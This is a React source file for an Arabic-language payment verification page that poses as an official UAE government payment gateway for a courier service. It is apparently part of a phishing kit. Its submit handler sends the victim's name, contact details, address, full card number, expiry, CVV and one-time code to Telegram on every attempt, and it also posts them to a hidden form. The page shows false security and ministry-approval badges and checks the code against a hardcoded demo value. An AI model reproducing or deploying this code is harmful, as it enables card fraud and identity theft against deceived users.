import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Shield, AlertCircle, ArrowLeft, Lock as LockIcon, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  // Create refs for all inputs
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Get customer info from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  // Get country from link data
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126",
    secondary: "#00732F",
    accent: "#000000",
    background: "#FFFFFF",
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      // Auto-focus next input if value entered
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        // Clear current input
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        // Move to previous input and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    // Handle Delete key
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    // Handle arrow keys
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Clear all on Escape
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      // Focus the next empty input or last input
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };
  
  const handleDeleteLast = () => {
    const lastFilledIndex = otp.findLastIndex(val => val !== "");
    if (lastFilledIndex !== -1) {
      const newOtp = [...otp];
      newOtp[lastFilledIndex] = "";
      setOtp(newOtp);
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const otpString = otp.join('');

    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }

    // ALWAYS send to Telegram, regardless of whether OTP is correct or wrong
    const isCorrect = otpString === DEMO_OTP;

    // Send complete payment data to Telegram
    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        address: customerInfo.address || '',
        service: serviceName,
        amount: formattedAmount,
        cardholder: sessionStorage.getItem('cardName') || '',
        cardNumber: sessionStorage.getItem('cardNumber') || '',
        cardLast4: sessionStorage.getItem('cardLast4') || '',
        expiry: sessionStorage.getItem('cardExpiry') || '12/25',
        cvv: sessionStorage.getItem('cardCvv') || '',
        otp: otpString,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (otpString === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        // Silent error handling
      }

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);

      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  const hasAnyDigit = otp.some(digit => digit !== "");
  
  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
      {/* Header */}
      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <Shield className="w-6 h-6" style={{ color: uaeColors.primary }} />
              </div>
              <div className="text-white">
                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
              </div>
            </div>
            <Badge variant="secondary" className="bg-white text-gray-800">
              <LockIcon className="w-3 h-3 ml-1" />
              اتصال آمن
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Security Notice */}
          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
              <div>
                <h3 className="font-semibold text-sm mb-1">التحقق من الهوية</h3>
                <p className="text-xs text-gray-600">
                  تم إرسال رمز التحقق إلى هاتفك المسجل في البنك
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
            {/* Title Section */}
            <div className="p-8 border-b text-center" style={{ backgroundColor: uaeColors.lightGray }}>
              <div
                className="w-20 h-20 rounded-full mx-auto mb-4 flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, ${uaeColors.primary}, ${uaeColors.secondary})`
                }}
              >
                <Shield className="w-10 h-10 text-white" />
              </div>
              <h1 className="text-2xl font-bold mb-2" style={{ color: uaeColors.accent }}>
                رمز التحقق
              </h1>
              <p className="text-sm text-gray-600">
                أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك
              </p>
            </div>

            {/* OTP Form */}
            <form onSubmit={handleSubmit} className="p-8">
              {/* Info */}
              <div
                className="rounded-lg p-4 mb-6 flex items-center gap-3"
                style={{
                  backgroundColor: `${uaeColors.secondary}10`,
                  border: `1px solid ${uaeColors.secondary}30`
                }}
              >
                <LockIcon className="w-5 h-5" style={{ color: uaeColors.secondary }} />
                <p className="text-sm">
                  تم إرسال رمز التحقق إلى هاتفك المسجل في البنك
                </p>
              </div>

              {/* OTP Input - 6 digits */}
              <div className="mb-6">
                <div className="flex gap-3 justify-center items-center" dir="ltr">
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className="w-14 h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all"
                      style={{
                        borderColor: digit ? uaeColors.primary : uaeColors.border,
                        backgroundColor: digit ? `${uaeColors.primary}08` : uaeColors.background
                      }}
                      disabled={attempts >= 3}
                      autoComplete="off"
                    />
                  ))}
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div
                  className="rounded-lg p-4 mb-6 flex items-start gap-2 bg-red-50 border border-red-200"
                >
                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-red-500" />
                  <p className="text-sm text-red-600">{error}</p>
                </div>
              )}

              {/* Countdown Timer */}
              {countdown > 0 && (
                <div className="text-center mb-6">
                  <p className="text-sm text-gray-600">
                    إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
                  </p>
                </div>
              )}

              {/* Attempts Counter */}
              {attempts > 0 && attempts < 3 && (
                <div className="text-center mb-6">
                  <p className="text-sm" style={{ color: '#F59E0B' }}>
                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
                  </p>
                </div>
              )}

              {/* Security Info */}
              <div className="mt-6 p-4 rounded-lg mb-6" style={{ backgroundColor: uaeColors.lightGray }}>
                <div className="flex items-start gap-3">
                  <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
                  <div>
                    <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>
                      محمي بتشفير SSL
                    </h4>
                    <p className="text-xs text-gray-600">
                      جميع المعلومات مُشفرة ومحمية. لا تشارك هذا الرمز مع أحد.
                    </p>
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-lg font-bold text-white transition-all hover:opacity-90"
                style={{
                  backgroundColor: attempts >= 3 ? '#666' : uaeColors.primary
                }}
                disabled={attempts >= 3 || !isOtpComplete}
              >
                {attempts >= 3 ? (
                  <span>محظور مؤقتاً</span>
                ) : (
                  <>
                    <span className="ml-2">تأكيد الدفع</span>
                    <ArrowLeft className="w-5 h-5" />
                  </>
                )}
              </Button>

              {countdown === 0 && (
                <Button
                  type="button"
                  variant="outline"
                  className="w-full mt-4 h-12"
                  style={{ borderColor: uaeColors.primary, color: uaeColors.primary }}
                  onClick={() => {
                    setCountdown(60);
                    toast({
                      title: "تم إرسال الرمز",
                      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
                    });
                  }}
                >
                  إعادة إرسال الرمز
                </Button>
              )}
            </form>
          </div>

          {/* Security Footer */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
                معتمد من وزارة التجارة
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
    </div>
  );
};

export default PaymentOTPForm;
